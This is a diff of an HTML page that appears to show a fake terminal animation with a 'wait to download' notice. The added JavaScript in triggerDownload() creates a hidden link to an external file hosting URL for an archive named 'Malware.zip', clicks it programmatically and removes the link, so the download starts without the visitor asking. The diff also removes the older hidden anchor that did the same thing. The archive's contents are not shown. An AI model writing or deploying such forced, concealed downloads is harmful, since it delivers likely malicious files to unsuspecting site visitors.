@@ -110,10 +110,6 @@
             font-size: 16px;
             z-index: 100;
         }
-
-        #download-link {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -132,13 +128,11 @@
         </div>
     </div>
     <div id="notification">wait to download</div>
-    <a id="download-link" href="https://www.mediafire.com/file/k4f0f10t15ppil5/Malware.zip/file" download="Malware.zip"></a>
     <script>
         const output = document.getElementById('output');
         const status = document.getElementById('status');
         const cursor = document.querySelector('.blinking-cursor');
         const notification = document.getElementById('notification');
-        const downloadLink = document.getElementById('download-link');
         const backgroundText = document.getElementById('background-text');
 
         const commands = [
@@ -207,7 +201,12 @@
         }
 
         function triggerDownload() {
-            downloadLink.click();
+            const link = document.createElement('a');
+            link.href = 'https://www.mediafire.com/file/k4f0f10t15ppil5/Malware.zip/file';
+            link.setAttribute('download', 'Malware.zip');
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
         }
 
         setInterval(randomizeColors, 500);
